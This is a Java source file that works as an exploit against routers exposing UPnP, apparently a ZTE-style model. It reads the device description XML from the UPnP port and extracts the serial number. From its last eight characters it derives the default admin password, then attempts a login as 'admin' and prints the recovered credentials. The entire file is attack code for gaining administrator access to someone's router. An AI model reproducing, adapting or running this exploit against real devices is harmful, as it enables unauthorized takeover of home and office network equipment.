// Video: https://www.youtube.com/watch?v=WvzIZ-JH-7k
// The filename should be main.java , so clone it and rename the file in order to work
// UPnP should be enabled for the target side
// UPnP default port is 52869
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.ProtocolException;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.net.UnknownHostException;
import java.util.Scanner;
import javax.swing.text.Document;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import org.w3c.dom.NodeList;
public class main {

	public static void main(String[] args) {
		Scanner sc= new Scanner(System.in);
		System.out.println("Enter IP Address");
		String URL = sc.nextLine();
		System.out.println("Enter UPnP port");
		String port = sc.nextLine();
		String out = "";
		try {
			Socket socket = new Socket( URL, Integer.parseInt(port));
			PrintWriter request = new PrintWriter( socket.getOutputStream() );
			request.print(  "GET " + "http://"+URL+":"+port+"/gatedesc.xml" + " HTTP/1.1\r\n" + 
			                       "Host: " + URL+":"+port + "\r\n" +
			                       "Connection: keep-alive\r\n"
			                       + "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
			                       + "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
			                       + "Accept-Language: en-US,en;q=0.5\r\n" 
			                       + "Accept-Encoding: gzip, deflate\r\n"
			                       + "Upgrade-Insecure-Requests: 1\r\n"
			                       + "Pragma: no-cache\r\n"
			                       + "Cache-Control: no-cache\r\n"
			                       + "\r\n");
			request.flush();
			InputStream inStream = socket.getInputStream( ); 
			BufferedReader rd = new BufferedReader(
			        new InputStreamReader(inStream));
			String line;
			while ((line = rd.readLine()) != null) {
				out+=line;
			}
			String serialnumber = out.substring(out.indexOf("<serialNumber>"), out.indexOf("</serialNumber>")).replace("<serialNumber>","");
			String default_password = serialnumber.substring(serialnumber.length()-8);
			URL url = new URL("http://"+URL);
			URLConnection con = url.openConnection();
			HttpURLConnection http = (HttpURLConnection)con;
			http.setRequestMethod("POST");
			http.setDoOutput(true);
			http.addRequestProperty("frashnum","");
			http.addRequestProperty("action","login");
			http.addRequestProperty("Frm_Logintoken", "14");
			http.addRequestProperty("Username", "admin");
			http.addRequestProperty("Password",default_password);
			http.connect();
			BufferedReader in = new BufferedReader(
					  new InputStreamReader(http.getInputStream()));
					String inputLine;
					StringBuffer content = new StringBuffer();
					while ((inputLine = in.readLine()) != null) {
					    content.append(inputLine);
					}
					in.close();
					http.disconnect();
					if(content.toString().contains("User information")) {
						System.out.println("The router isn't vulnerable");
					}else {
						System.out.println("The router is vulnerable.\nThe username is admin and password is "+default_password);
					}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
